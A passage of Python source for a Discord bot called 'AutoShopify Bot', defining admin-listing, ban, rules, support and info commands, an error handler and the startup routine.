async def list_admins(ctx):
    """List all admins"""
    
    if not is_admin(ctx):
        embed = discord.Embed(title="❌ Permission Denied", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    conn = sqlite3.connect('autoshopify.db')
    c = conn.cursor()
    c.execute('SELECT user_id, username FROM users WHERE is_admin = 1')
    admins = c.fetchall()
    conn.close()
    
    embed = discord.Embed(title="👥 Admin List", color=discord.Color.purple())
    
    if admins:
        admin_list = '\n'.join([f"`{username}` ({user_id})" for user_id, username in admins])
        embed.add_field(name=f"Total: {len(admins)}", value=admin_list, inline=False)
    else:
        embed.add_field(name="No Admins", value="No admins found", inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name='ban', help='Ban user from bot [OWNER ONLY]')
async def ban_user(ctx, user: discord.User = None):
    """Ban user from bot"""
    
    if not is_owner(ctx):
        embed = discord.Embed(title="❌ Permission Denied", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    if not user:
        embed = discord.Embed(title="❌ User Not Found", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(
        title="✅ User Banned",
        description=f"{user.mention} has been banned",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)
    logger.info(f"[{ctx.author}] Banned {user}")

# ======================== COMMANDS - INFO ========================

@bot.command(name='rules', help='Show server rules')
async def rules_command(ctx):
    """Display server rules"""
    embed = discord.Embed(title="📋 Server Rules", color=discord.Color.blue())
    embed.add_field(name="1. Be Respectful", value="Treat all members with respect", inline=False)
    embed.add_field(name="2. No Spam", value="Don't spam messages or commands", inline=False)
    embed.add_field(name="3. No Sharing", value="Do not share personal information", inline=False)
    embed.add_field(name="4. Follow Discord ToS", value="Comply with Discord's Terms of Service", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='support', help='Get support information')
async def support_command(ctx):
    """Display support information"""
    embed = discord.Embed(title="🎫 Support", color=discord.Color.gold())
    embed.add_field(name="Support Channel", value=f"<#{SUPPORT_CHANNEL_ID}>", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='info', help='Show bot information')
async def info_command(ctx):
    """Display bot information"""
    embed = discord.Embed(title="AutoShopify Bot Info", color=discord.Color.purple())
    embed.add_field(name="Version", value="2.0.0", inline=True)
    embed.add_field(name="Prefix", value="!", inline=True)
    embed.add_field(name="Commands", value="`!help` for all commands", inline=False)
    await ctx.send(embed=embed)

# ======================== ERROR HANDLERS ========================

@bot.event
async def on_command_error(ctx, error):
    """Handle command errors"""
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            title="❌ Missing Arguments",
            description=f"Command: `{ctx.command.name}`\nHelp: `!help {ctx.command.name}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        embed = discord.Embed(title="❌ Error", description=str(error), color=discord.Color.red())
        await ctx.send(embed=embed)
        logger.error(f"Command error: {str(error)}")

# ======================== BOT STARTUP ========================

if __name__ == "__main__":
    if not token:
        print("❌ ERROR: TOKEN not found in .env file!")
        exit(1)
    
    print("Starting AutoShopify Discord Bot v2.0...")
    bot.run(token, log_handler=handler)
